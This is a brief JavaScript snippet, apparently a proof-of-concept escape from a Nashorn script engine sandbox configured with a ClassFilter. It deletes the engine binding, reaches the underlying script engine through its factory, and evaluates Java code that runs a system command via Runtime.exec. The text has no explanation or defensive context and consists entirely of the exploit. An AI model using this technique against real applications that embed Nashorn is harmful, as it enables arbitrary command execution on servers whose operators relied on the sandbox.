// In Nashorn engine with ClassFilter configured:
delete this.engine;
this.engine.factory.scriptEngine.eval(
    'java.lang.Runtime.getRuntime().exec("whoami")'
);
